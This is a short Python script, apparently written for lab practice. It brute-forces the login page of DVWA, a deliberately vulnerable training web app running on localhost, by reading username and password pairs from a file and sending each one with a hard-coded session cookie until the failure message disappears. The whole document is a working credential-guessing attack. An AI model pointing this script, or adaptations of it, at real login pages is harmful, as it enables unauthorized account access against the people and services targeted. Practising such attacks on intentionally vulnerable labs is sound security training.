import requests

url = "http://127.0.0.1/DVWA/vulnerabilities/brute/"

# Target cookies
cookie = {"PHPSESSID": "pqji7030rocs2degqrc7fcb632", "security": "low"}


def login_try(usr, password):
    print(f"Trying username={usr} and password={password}")

    payload = f"?username={usr}&password={password}&Login=Login"
    
    r = requests.get(url + payload, cookies=cookie)

    if "Username and/or password incorrect" not in r.text:
        print(f">>Valid username: {usr} & password: {password}")
        exit()
    else:
        print(f"Invalid username: {usr} & password: {password}")


with open("passwordList.txt", "r") as f:
    for line in f:
        usrname, password = line.strip().split(",")  # strip() remove extra space from beggining to ending
        
        login_try(usrname, password)
